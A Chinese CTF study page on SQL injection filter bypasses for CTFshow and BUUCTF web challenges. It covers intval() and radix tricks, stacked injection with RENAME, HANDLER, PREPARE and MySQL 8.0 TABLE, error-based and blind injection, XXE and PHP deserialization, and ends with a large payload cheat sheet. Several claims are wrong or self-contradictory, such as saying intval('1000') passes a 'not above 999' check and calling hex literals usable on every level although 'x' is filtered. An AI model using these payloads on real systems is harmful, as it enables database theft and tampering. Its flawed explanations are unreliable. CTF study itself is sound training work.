---
title: CTFshow & BUUCTF SQL注入绕过技术全谱：从基础到进阶利用链
description: 系统整合 CTFshow WEB 入门关卡（第 1-7 关）基础绕过技术与 BUUCTF 实战题目中的进阶 SQL 注入利用链，涵盖 intval()
  特性利用、正则过滤递进绕过、进制转换、位运算、堆叠注入、报错注入、XPath 注入、盲注、宽字节注入、二阶注入等核心技术，新增 MySQL 8.0 TABLE
  语句实现堆叠注入绕过 SELECT 过滤的技术细节，结合 2021 鹤城杯 easy_sql_2 题目实战演示版本特性利用思路。
category: program-analysis
tags:
- CTF
- SQL Injection
- Bypass Techniques
- CTFshow
- BUUCTF
- Web Security
- PHP
- MySQL
- Stacked Injection
- Error-based SQLi
- XPath Injection
- Blind SQLi
- intval
- Regex Bypass
- Base Conversion
- Bitwise Operations
- Union Injection
- Filter Bypass
- MySQL 8.0
- TABLE Statement
- Hecheng Cup
date: '2024-01-15'
updated: '2026-11-15'
---

## 概述

本页面系统整合 **CTFshow WEB 入门系列第 1-7 关** 的 SQL 注入基础绕过核心知识点，并补充 **BUUCTF Web 方向实战题目** 中的进阶利用链与绕过姿势。题目核心逻辑多为：通过 `GET/POST` 参数查询数据库，需满足特定条件（如 `intval($id) > 999`）并绕过层层递进的正则/WAF 过滤，最终构造 Payload 实现注入、读取文件、执行命令或获取 Flag。

**新增内容**：深度解析 **MySQL 8.0 TABLE 语句** 在堆叠注入中绕过 `SELECT` 关键字过滤的原理与实战，结合 **2021 鹤城杯 easy_sql_2** 题目复现完整利用链。

> **关联页面**：
> - 后续 CTFshow 第 8-23 关涉及命令执行、文件包含、日志投毒等 RCE 技术，详见 [[ctf-show-php-command-execution-bypass-techniques]]。
> - MySQL 报错注入原理深度解析，详见 [[mysql-duplicate-entry-error-based-sqli]]。
> - MySQL DNSLog 盲注外带数据技术，详见 [[mysql-dnslog-injection-loadfile-unc]]。
> - MongoDB NoSQL 注入四大手法，详见 [[mongodb-nosql-injection-guide]]。
> - Java 参数化查询防御原理，详见 [[java-preparedstatement-sql-injection-defense]]。
> - SSRF 绕过与利用链，详见 [[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]]。
> - 2021 鹤城杯 Web+Misc 完整 Writeup，详见 [[hec-cup-2021-web-misc-writeup]]。

---

## 核心代码模板（CTFshow 1-7 关通用骨架）

所有 1-7 关共享同一骨架，仅正则过滤规则逐关收紧：

```php
<?php
include("config.php");
if(isset($_GET['id'])) {
    $id = $_GET['id'];
    // 正则过滤（各关不同）
    if(preg_match($regex_pattern, $id)) {
        die("id error");
    }
    // 整数值判断
    if(intval($id) > 999) {
        die("id error");
    } else {
        $sql = "select * from article where id = $id order by id limit 1";
        // 执行查询并回显
    }
}
?>
```

**关键约束**：
1. `intval($id) > 999` → 必须绕过整数值判断
2. 正则过滤逐关增强 → 需对应调整 Payload 形式
3. SQL 语句直接拼接 `$id` → 无引号包裹，数值型注入

---

## 第一部分：CTFshow WEB 1-7 基础绕过技术演进

### WEB-1：`intval()` 特性初探

**过滤规则**：`/or|\+/i`（过滤 `or`、`+`）

**核心技术**：`intval()` 字符串处理特性
- `intval()` 从字符串起始位置读取数字，遇非数字字符停止
- 起始为非数字则返回 `0`
- 示例：`intval('100a123') = 100`，`intval('a123') = 0`

**Payload**：
```text
?id='1000'
```
- `intval('1000')` → `1000`（不大于 999，通过）
- SQL 拼接：`id = '1000'` → MySQL 隐式转换等同于 `1000`

---

### WEB-2：基础正则绕过

**过滤规则**：`/or|\+/i`（同 WEB-1）

**Payload**：同 WEB-1，单引号字符串绕过 `intval` 判断。

---

### WEB-3：运算符与关键字扩展过滤

**过滤规则**：`/or|\-|\\|\*|\<|\>|\!|x|hex|\+/i`
- 新增过滤：`-` `\` `*` `<` `>` `!` `x` `hex`

**Payload**：`?id='1000'` 仍可用（单引号未被过滤）。

---

### WEB-4：SQL 关键字过滤

**过滤规则**：`/or|\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i`
- 新增过滤：`/` `(` `)` `select`

**Payload**：`?id='1000'` 仍有效。

---

### WEB-5：引号过滤 → 位运算/进制绕过

**过滤规则**：`/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i`
- **单双引号被过滤**，字符串绕过失效

**绕过方案**：

| 技术类别 | Payload 示例 | 原理说明 |
|----------|--------------|----------|
| **双重取反** | `~~1000` | `~` 按位取反，两次还原 |
| **异或运算** | `200^800` | `^` 未被过滤，结果为 1000 |
| **二进制字面量** | `0b1111101000` | MySQL 支持 `0b` 前缀 |
| **十六进制字面量** | `0x3e8` | MySQL 支持 `0x` 前缀 |

**异或运算详解**：
```
200 (十进制) = 0000 0000 1100 1000 (二进制)
800 (十进制) = 0000 0011 0010 0000 (二进制)
------------------------------------------------
200 ^ 800    = 0000 0011 1110 1000 (二进制) = 1000 (十进制)
```

---

### WEB-6：异或运算符被禁 → 仅剩取反

**过滤规则**：新增过滤 `^`

**可用 Payload**：
- `~~1000`（双重取反）
- `0b1111101000`（二进制）
- `0x3e8`（十六进制）

---

### WEB-7：取反符号被禁 → 进制字面量终极绕过

**过滤规则**：新增过滤 `~`

**唯一可用数值构造**：
- `0b1111101000`（二进制）
- `0x3e8`（十六进制）
- 算术运算组合（见下节）

---

### 通用绕过技术总结（WEB 1-7 通杀）

#### 进制转换

| 进制 | 语法 | 1000 表示 |
|------|------|-----------|
| 二进制 | `0b...` | `0b1111101000` |
| 八进制 | `0...` | `01750` |
| 十六进制 | `0x...` | `0x3e8` |

> MySQL 解析数值字面量时自动识别上述前缀，`intval()` 在 PHP 中**不识别**这些前缀（`intval('0x3e8') = 0`），完美形成差异利用。

#### 位运算操作

| 运算 | 示例 | 说明 |
|------|------|------|
| 双重取反 | `~~1000` | 需 `~` 未被过滤 |
| 异或 | `200^800` | 任意 `a^b=1000` 均可 |
| 按位或 | `992\|8` | `992|8 = 1000` |
| 按位与 | `1023&1000` | `1023&1000 = 1000` |

#### 算术运算符构造

| 运算 | 示例 | URL 编码注意 |
|------|------|--------------|
| 加法 | `200+800` | `+` → `%2b` |
| 减法 | `2000-1000` | `-` 常被过滤 |
| 乘法 | `200*5` | `*` 常被过滤 |
| 除法 | `10000/10` | `/` 常被过滤 |
| 负负得正 | `--1000` | 双负号 |

#### SQL 注入直接构造（绕过 `intval` 逻辑）

利用 `intval('abc') = 0` 特性，配合 SQL 语法：

| Payload | SQL 效果 | 条件 |
|---------|----------|------|
| `1 or 1=1#` | 恒真注入 | 需 `or`、`#` 未被过滤 |
| `0 union select ...` | 联合查询 | 需 `union`、`select` 未被过滤 |

#### 绕过 `intval()` 的字符串包裹技巧

| 形式 | `intval()` 结果 | SQL 语法有效性 |
|------|-----------------|----------------|
| `'1000'` | 0 | ✅ 有效 |
| `(1000)` | 0 | ✅ 有效 |
| ` 1000` | 0 | ✅ 有效（前导空格） |

---

### 正则过滤递进对照表

| 关卡 | 新增过滤项 | 累计过滤关键字/符号 | 可用核心技术 |
|------|------------|---------------------|--------------|
| 1 | `or` `+` | `or` `+` | 字符串 `'1000'` |
| 2 | — | `or` `+` | 字符串 `'1000'` |
| 3 | `-` `\` `*` `<` `>` `!` `x` `hex` | 上述 + 运算符/关键字 | 字符串 `'1000'` |
| 4 | `/` `(` `)` `select` | 上述 + SQL 关键字 | 字符串 `'1000'` |
| 5 | `'` `"` `|` | **引号、管道符** | 位运算、进制、算术 |
| 6 | `^` | 异或 | 取反、进制、算术 |
| 7 | `~` | 取反 | **仅进制、算术** |

---

## 第二部分：BUUCTF 进阶 SQL 注入利用链与绕过姿势

### 堆叠注入 —— 多语句执行与表结构重写

**核心原理**：MySQL 默认 `mysqli::multi_query` 或 `PDO::MYSQL_ATTR_MULTI_STATEMENTS` 允许分号分隔多条语句。若过滤未拦截 `;`，可构造完整 DDL/DML 链。

#### 典型案例：BUUCTF #4 "随便注" / #6 "(SUCTF) easysql" / #31 "Backlist"

**过滤环境**：过滤 `' " select union or 等关键字，但允许 `;` `rename` `alter` `handler` `set` `prepare` `execute`。

**利用链 1：表重命名 + 列重命名 + 自增主键构造**
```sql
'; rename table words to word1;
rename table `1919810931114514` to words;
alter table words add id int unsigned not null auto_increment primary key;
alter table words change flag data varchar(100);#
```
1. 将原表 `words` 改名为 `word1`
2. 将藏有 flag 的表 `1919810931114514` 改名为 `words`
3. 为新 `words` 表添加自增主键 `id`（满足 `order by id`）
4. 将 `flag` 列重命名为 `data`（匹配原查询 `select *` 回显字段）

**利用链 2：Handler 直接读取表记录（绕过 SELECT 过滤）**
```sql
'; handler `FlagHere` open as `a`; handler `a` read next;#
```
- `handler tbl_name open as alias`：打开表并获取句柄
- `handler alias read next`：读取下一行记录
- 完全绕过 `select` 关键字过滤，直接操作存储引擎层

**利用链 3：Prepared Statement + 字符编码绕过引号过滤**
```sql
'; set @tn=0x31393139383130393331313134353134;  -- 表名十六进制
set @sql=concat(char(115,101,108,101,99,116)," * from `",@tn,"`");
prepare sqla from @sql; execute sqla;#
```
- `char()` 构造 `select` 字符串
- 十六进制/字符编码绕过引号与关键字过滤
- `prepare`/`execute` 实现动态 SQL 执行

**利用链 4：SQL Mode 切换 + 管道符拼接（SUCTF easysql）**
```sql
1; set sql_mode=pipes_as_concat; select 1||flag from Flag#
```
- `pipes_as_concat` 使 `||` 变为字符串拼接而非逻辑或
- `select 1||flag` 等价于 `select concat(1, flag)`，构造可控列内容

#### **新增：MySQL 8.0 TABLE 语句绕过 SELECT 过滤（2021 鹤城杯 easy_sql_2 实战）**

**技术背景**：
- MySQL 8.0.19 引入 `TABLE` 语句，语法：`TABLE table_name` 等价于 `SELECT * FROM table_name`
- 支持 `ORDER BY`、`LIMIT`、`WHERE`（8.0.20+）等子句
- **关键特性**：`TABLE` 语句**不包含 `SELECT` 关键字**，可绕过基于关键字的 WAF/正则过滤

**鹤城杯 easy_sql_2 题目环境**：
- 过滤规则：拦截 `select`、`union`、`or` 等核心关键字
- 数据库版本：MySQL 8.0（支持 `TABLE` 语句）
- 注入点：支持堆叠查询（多语句执行）
- 目标：读取 Flag 表数据

**利用链构造**：

```sql
-- 步骤 1：探测表名（假设已知或通过 information_schema 泄露）
-- 步骤 2：使用 TABLE 语句直接读取表内容，配合堆叠注入
'; TABLE `flag_table`; #
```

**完整 Payload 示例**：
```sql
'; TABLE `1919810931114514`; #
```
- `;` 闭合前置查询，开启堆叠注入
- `TABLE \`1919810931114514\`` 直接输出表所有行列（等价 `SELECT * FROM ...`）
- `#` 注释掉后续 SQL

**进阶变体（带排序限制）**：
```sql
'; TABLE `flag_table` ORDER BY `id` LIMIT 1; #
```
- 支持 `ORDER BY`、`LIMIT` 子句，精确控制输出

**对比优势**：

| 绕过方式 | Payload 示例 | 适用条件 | 局限性 |
|----------|--------------|----------|--------|
| `HANDLER` | `handler \`t\` open as a; handler a read next;` | 所有版本 | 语法较繁琐，需两条语句 |
| `PREPARE` | `set @s=concat(char(...)); prepare x from @s; execute x;` | 所有版本 | 依赖 `prepare`/`execute` 权限 |
| **`TABLE` (MySQL 8.0.19+)** | `TABLE \`t\`;` | **MySQL 8.0.19+** | **语法最简洁，单语句完成，直观** |

**实战复现流程（鹤城杯 easy_sql_2）**：
1. **版本确认**：通过 `SELECT VERSION()` 或报错注入确认 MySQL 8.0+
2. **表名枚举**：利用报错注入或 `information_schema` 获取目标表名（如 `1919810931114514`）
3. **构造堆叠注入**：`?id=1; TABLE \`1919810931114514\`; #`
4. **获取 Flag**：页面直接回显表内容，包含 Flag 字段

> **防御启示**：禁用多语句执行（`mysqli::multi_query=false`）、最小权限账号（禁止 `alter`/`rename`/`handler`/`TABLE`）、WAF 拦截分号与 DDL/DML 关键字、升级 MySQL 版本时评估新语法带来的攻击面。

---

### 报错注入 —— XPath Error-based (updatexml / extractvalue)

**核心原理**：MySQL `updatexml(xml_target, xpath_expr, new_xml)` 与 `extractvalue(xml_frag, xpath_expr)` 在 XPath 解析报错时，将错误信息（含注入数据）回显至前端。配合 `concat()`、`rand()`、`floor()` 等函数实现数据外带。

#### 典型案例：BUUCTF #25 "hardsql" / #26 "hack world" / #30 "facebook"

**过滤环境**：过滤空格、`=`、`substring`、`mid`、`union`、`select` 等，但允许 `updatexml`、`extractvalue`、`concat`、`left`/`right`、`group_concat`。

**Payload 模板**：
```sql
' or updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+
' or updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database())), 1) --+
' or updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='H4rDsq1')), 1) --+
' or updatexml(1, concat(0x7e, (select right(group_concat(id,0x7e,username,0x7e,password),30) from H4rDsq1)), 1) --+
```

**关键技巧**：
1. **无空格绕过**：利用括号、Tab、换行、注释 `/**/` 替代空格
2. **无等号绕过**：`where table_schema like database()` 代替 `=`
3. **长字段分段提取**：`left(str,30)` / `right(str,30)` 结合多次查询拼接完整数据
4. **双重报错函数互补**：`updatexml` 与 `extractvalue` 任一可用即可
   ```sql
   ' and extractvalue(1, concat(0x7e, (select group_concat(password) from users))) --+
   ```

**facebook 题目实战流程**：
1. 报错注入爆库：`fakebook`
2. 爆表：`users`
3. 爆列：`no,username,passwd,data,USER,CU`
4. 发现 `data` 列存储序列化对象 → 结合反序列化利用链（见 2.6 节）

> **关联页面**：[[mysql-duplicate-entry-error-based-sqli]] 深度解析 `floor(rand(0)*2)` 与 `GROUP BY` 交互机制。

---

### XPath 注入 —— XML 查询语言注入

**核心原理**：应用将用户输入直接拼接进 XPath 查询表达式，导致逻辑篡改或数据遍历。常见于 XML 数据存储、SAML/SSO、Web Service 场景。

#### 典型案例：BUUCTF #30 "facebook" (XPath 报错复用) / #44 "Fake XML cookbook" (XXE 结合)

**XPath 盲注布尔化判断**：
```xpath
' or 1=1 or ''='
' or string-length(//user[1]/password)>10 or ''='
' or substring(//user[1]/password,1,1)='a' or ''='
```

**XXE + XPath 组合拳（Fake XML cookbook）**：
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE hack [
  <!ENTITY file SYSTEM "file:///flag">
]>
<user><username>&file;</username><password>hack</password></user>
```
- 外部实体 `&file;` 读取本地文件
- XPath 查询 `//user/username` 将文件内容回显

> **关联页面**：[[xxe-xml-dtd-fundamentals]] 系统梳理 XXE 漏洞利用核心基础。

---

### 盲注 —— 布尔/时间/异或侧信道

**核心原理**：无直接回显、无报错回显时，通过页面逻辑差异（布尔）、响应延迟（时间）、异或运算结果为空/非空（侧信道）逐位提取数据。

#### 典型案例：BUUCTF #26 "hack world" (异或盲注) / #9 "LoveSql" (联合查询盲注)

**异或盲注原理（hack world）**：
```sql
id = 1^(ascii(substr((select flag from flag),1,1))=102)
```
- `1^1 = 0` (假) → 页面返回空/错误
- `1^0 = 1` (真) → 页面返回正常内容
- 通过判断页面响应长度/内容差异，逐字符爆破 Flag

**Python 自动化脚本**：
```python
import requests
url = "http://xxx/node3.buuoj.cn/index.php"
flag = ""
for i in range(1, 100):
    for j in range(45, 126):
        payload = f"1^(ascii(substr((select flag from flag),{i},1))={j})"
        r = requests.post(url, data={"id": payload})
        if len(r.text) > baseline:  # 真条件响应特征
            flag += chr(j)
            break
```

**LoveSql 联合查询盲注**：
```sql
-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='geek')#
-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1')#
-1' union select 1,2,(select group_concat(concat_ws(0x7e,username,password)) from l0ve1ysq1)#
```
- 先确定列数（`order by` / `union select 1,2,3`）
- 利用 `group_concat` 聚合多行数据单次回显
- `concat_ws(0x7e, ...)` 以 `~` 分隔字段便于解析

---

### 宽字节注入 / 编码绕过 / 二阶注入

#### 宽字节注入（GBK/Big5 编码环境）
```php
// PHP 设置字符集为 GBK
$id = $_GET['id'];
// addslashes 转义单引号为 \' (0x5c27)
// 攻击输入 %df%27 → %df%5c%27 → 宽字节 運' → 单引号逃逸
```
**Payload**：`?id=%df%27 or 1=1%23`

#### 双重 URL 编码绕过 WAF
```text
%2527 → 经第一次解码为 %27 → 经第二次解码为 ' (单引号)
```
适用于 Nginx + PHP-FPM、Apache + mod_php 等多层解码场景。

#### 二阶注入（存储型注入）
1. **注入存储**：注册用户名 `admin'--`，经转义存入数据库为 `admin\'--`
2. **触发执行**：修改密码页面 `update users set pass='new' where user='admin\'--'` → 单引号闭合，注释掉后续条件，实现任意用户密码修改。

> **关联页面**：[[ssrf-bypass-techniques]] 覆盖编码绕过、302 跳转、DNS 重绑定等通用绕过思路。

---

### 结合反序列化/文件操作的复合利用链

#### nizhuansiwei (#23) / ZJCTF (#39) / had a had day (#43) —— PHP 伪协议 + 反序列化

**文件包含 + php://filter 读取源码**：
```text
?file=php://filter/read=convert.base64-encode/resource=flag
?file=php://filter/convert.base64-encode/resource=index
```

**反序列化对象注入（nizhuansiwei）**：
```php
// 1. 构造 Flag 类对象，file 指向 flag.php
class Flag { public $file = "flag.php"; }
$obj = new Flag();
$payload = serialize($obj); // O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

// 2. 通过 password 参数传入序列化字符串
// 3. 触发 __toString() -> file_get_contents($this->file) 读取 Flag
```

**对象逃逸（easy_serialize_php #47）**：
```php
// 利用 extract($_POST) 变量覆盖 + filter 过滤导致序列化字符串长度变化
// 构造 _SESSION[function] = 'a:1:{";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// 经 filter 过滤 flag 关键字后，反序列化时对象计数不匹配，跳过 __wakeup，实现任意对象注入
```

> **关联页面**：[[php伪协议与反序列化利用]] 深度解析 `php://filter`、`phar://`、反序列化魔术方法绕过、`__wakeup` 对象计数绕过等完整利用链。

---

### 其他高频绕过技巧速查

| 场景 | 绕过技巧 | 示例 Payload |
|------|----------|--------------|
| **MD5 强/弱碰撞** | `0e` 科学计数法字符串 / 不同前缀相同 MD5 | `a=240610708&b=QNKCDZO` (均以 `0e` 开头) |
| **弱类型比较** | `1234567c == 1234567` (PHP 仅比较数字前缀) | `password=1234567c` |
| **科学计数法** | `1e9` 等价于 `1000000000` | `money=1e9` |
| **注释符变体** | `#` → `%23`；`-- ` → `--%20`；`/* */` → `/**/` | `1' union select 1,2,3%23` |
| **大小写混淆** | `UnIoN SeLeCt` | 绕过 `/i` 模式外的大小写敏感过滤 |
| **内联注释** | `union/**/select` | 绕过 `union select` 关键字连续匹配 |
| **双写绕过** | `ununionion seselectlect` | 过滤器单次替换后重组为 `union select` |
| **十六进制字面量** | `0x3e8` = 1000 | 无引号数值注入通杀 |
| **编码函数绕过** | `char(115,101,108,101,99,116)` = `select` | 绕过关键字过滤 |
| **SQL Mode 利用** | `set sql_mode=pipes_as_concat` | 使 `||` 变为字符串拼接 |

---

## 实战要点与避坑指南

1. **`intval()` 与 MySQL 解析差异是核心**
   - PHP `intval('0x3e8')` = 0
   - MySQL `0x3e8` = 1000
   - 利用此差异同时满足“整数值 ≤ 999”与“SQL 实际值 = 1000”

2. **URL 编码必须处理**
   - `+` → `%2b`
   - `#` → `%23`
   - 空格 → `%20` 或 `+`

3. **正则大小写不敏感（`/i` 模式）**
   - `SELECT`、`Select` 均会被拦截

4. **MySQL 数值字面量自动转换**
   - `0b1111101000`、`0x3e8`、`01750` 在 SQL 中均为 1000
   - 无需引号包裹，直接拼接进入 SQL

5. **堆叠注入需确认多语句执行权限**
   - `mysqli::multi_query` / `PDO::MYSQL_ATTR_MULTI_STATEMENTS`
   - 权限不足时转向报错/盲注/联合查询

6. **报错注入长度限制**
   - `updatexml`/`extractvalue` 报错信息长度有限（~64 字符）
   - 必须配合 `left()`/`right()`/`mid()` 分段提取

7. **盲注效率优化**
   - 二分法查找 ASCII 码（`ascii(substr(...,1,1))>128`）
   - 并发请求加速（Python `threading`/`asyncio`）
   - 优先爆库/表/列名，再爆数据

8. **宽字节注入前提**
   - 数据库/表/连接字符集为 GBK/Big5 等多字节编码
   - PHP `addslashes`/`mysqli_real_escape_string` 未设置正确字符集

9. **MySQL 版本特性利用（新增）**
   - **MySQL 8.0.19+**：`TABLE` 语句绕过 `SELECT` 过滤
   - **MySQL 8.0.20+**：`TABLE` 支持 `WHERE` 子句，功能更完整
   - 实战中**首选版本特性**，语法简洁、可读性强、绕过效果佳

---

## 知识图谱关联

| 技术领域 | 关联页面 | 核心内容 |
|----------|----------|----------|
| **CTFshow 进阶** | [[ctf-show-php-command-execution-bypass-techniques]] | WEB 8-23 关：命令执行、文件包含、日志投毒、无字母数字 RCE、disable_functions 绕过 |
| **MySQL 报错注入** | [[mysql-duplicate-entry-error-based-sqli]] | `floor(rand(0)*2)` 与 `GROUP BY` 虚拟表主键冲突机制深度解析 |
| **MySQL DNSLog 外带** | [[mysql-dnslog-injection-loadfile-unc]] | `load_file()` + UNC 路径实现盲注数据外带 |
| **NoSQL 注入** | [[mongodb-nosql-injection-guide]] | 四大注入手法：联合查询、JS注入、盲注、重言式/数组注入 |
| **Java 防御** | [[java-preparedstatement-sql-injection-defense]] | 参数化查询原理、`useServerPrepStmts` 验证真正服务端预编译 |
| **SSRF 绕过** | [[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]] | 五大核心绕过技巧、Gopher/FastCGI/Redis 利用链 |
| **XXE 基础** | [[xxe-xml-dtd-fundamentals]] | XML/DTD/实体引用/外部实体任意文件读取原理 |
| **PHP 反序列化** | [[php伪协议与反序列化利用]] | `php://filter`、`phar://`、魔术方法、`__wakeup` 绕过、对象逃逸 |
| **PHP Webshell** | [[php-webshell-fundamentals-chopper-analysis]]、`[[php-webshell-obfuscation-av-evasion]]` | `eval()` 执行原理、蚁剑流量分析、C++ 多态混淆免杀 |
| **鹤城杯 2021 完整 Writeup** | [[hec-cup-2021-web-misc-writeup]] | PHP 黑魔法、流量取证盲注、MySQL 8.0 TABLE 注入、SSRF Gopher 攻击 MySQL、Spring Web Flow CVE-2017-4971 RCE |

---

## 附录：常用 Payload 速查表

```text
# === CTFshow 1-7 基础 ===
# 字符串绕过（WEB 1-4）
?id='1000'
?id="1000"
?id=(1000)

# 进制字面量（全关通用）
?id=0b1111101000
?id=0x3e8
?id=01750

# 位运算（视过滤情况）
?id=~~1000
?id=200^800
?id=992|8
?id=1023&1000

# 算术运算（视过滤情况）
?id=200%2b800
?id=2000-1000
?id=200*5
?id=10000/10
?id=--1000

# === BUUCTF 进阶 ===
# 堆叠注入 - 表重命名
'; rename table words to word1; rename table `1919810931114514` to words; alter table words add id int unsigned not null auto_increment primary key; alter table words change flag data varchar(100);#

# 堆叠注入 - Handler 直接读取
'; handler `FlagHere` open as `a`; handler `a` read next;#

# 堆叠注入 - Prepared Statement 绕过引号
'; set @tn=0x31393139383130393331313134353134; set @sql=concat(char(115,101,108,101,99,116)," * from `",@tn,"`"); prepare sqla from @sql; execute sqla;#

# 堆叠注入 - MySQL 8.0 TABLE 语句（新增，鹤城杯 easy_sql_2 实战）
'; TABLE `1919810931114514`; #
'; TABLE `flag_table` ORDER BY `id` LIMIT 1; #

# 报错注入 - updatexml 爆库/表/列/数据
' or updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+
' or updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database())), 1) --+
' or updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='H4rDsq1')), 1) --+
' or updatexml(1, concat(0x7e, (select right(group_concat(id,0x7e,username,0x7e,password),30) from H4rDsq1)), 1) --+

# 报错注入 - extractvalue 备选
' and extractvalue(1, concat(0x7e, (select group_concat(password) from users))) --+

# 联合查询 - 双写绕过
-1' ununionion seselectlect 1,2,(seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek')#

# 联合查询 - 内联注释绕过
-1' union/**/select 1,load_file('/var/www/html/flag.php'),3,4 --+

# 异或盲注 - 逐字符爆破
1^(ascii(substr((select flag from flag),1,1))=102)

# 宽字节注入 (GBK)
?id=%df%27 or 1=1%23

# 二阶注入 - 注册用户名
admin'--

# PHP 伪协议读取文件
?file=php://filter/read=convert.base64-encode/resource=flag
?file=php://filter/convert.base64-encode/resource=index

# 反序列化对象注入
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}

# MD5 弱类型碰撞
a=240610708&b=QNKCDZO
# 或强碰撞
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

# 科学计数法绕过
money=1e9
password=1234567c
```

---

*页面维护：数字知识库策展人 | 最后更新：2026-11-14 | 来源：0w1Club 微信归档《CTFshow 萌新题》+ BUUCTF Web 实战归档《BUUCTF -web安全部分 刷题分享》+ 2021 鹤城杯 Web+Misc Writeup 微信归档*

## 来源

- [0xfafu攻防实验室-202010-202112_09](../sources/0xfafu攻防实验室-202010-202112_09.md)
